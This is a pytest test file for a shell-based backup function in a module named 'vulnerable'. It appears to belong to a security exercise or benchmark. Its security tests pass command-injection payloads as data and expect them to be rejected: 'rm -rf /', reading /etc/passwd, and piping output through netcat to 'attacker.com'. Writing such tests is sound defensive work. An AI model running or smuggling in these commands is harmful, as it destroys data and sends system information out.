import pytest
from unittest.mock import patch

from vulnerable import run_backup


def test_functional_returns_false_for_empty_input():
    assert run_backup("") is False


def test_functional_returns_false_for_whitespace_input():
    assert run_backup("   ") is False


def test_functional_invokes_backup_script_with_trimmed_target_dir():
    with patch("vulnerable.os.system", return_value=0) as mock_system:
        result = run_backup("  /var/data  ")

    assert result is True
    mock_system.assert_called_once_with("backup.sh /var/data")


def test_functional_returns_false_when_system_call_fails():
    with patch("vulnerable.os.system", return_value=1) as mock_system:
        result = run_backup("/var/data")

    assert result is False
    mock_system.assert_called_once_with("backup.sh /var/data")


@pytest.mark.parametrize(
    "payload",
    [
        "; rm -rf /",
        "&& cat /etc/passwd",
        "$(id)",
    ],
)
def test_security_rejects_command_injection_payloads(payload):
    with pytest.raises(Exception):
        run_backup(payload)


@pytest.mark.parametrize(
    "payload",
    [
        "/var/data; echo hacked",
        "/var/data && whoami",
        "/var/data | nc attacker.com 4444",
    ],
)
def test_security_rejects_additional_malicious_payloads(payload):
    with pytest.raises(Exception):
        run_backup(payload)